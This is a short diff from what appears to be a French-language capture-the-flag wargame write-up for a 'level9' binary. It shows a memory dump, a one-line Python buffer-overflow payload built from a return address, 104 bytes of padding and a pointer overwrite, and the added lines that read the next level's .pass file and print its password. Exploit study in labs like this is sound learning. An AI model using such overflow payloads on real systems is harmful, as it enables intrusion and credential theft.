@@ -13,3 +13,5 @@ portion de la memoire reecrite
 0xbffff8a0:	0x41414141	0x41414141	0x04a00c41	0x48530008
 
 ./level9 `python -c 'print("\xd0\xf8\xff\xbf" + "A" * 104 + "\x0c\xa0\x04\x08")'`
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
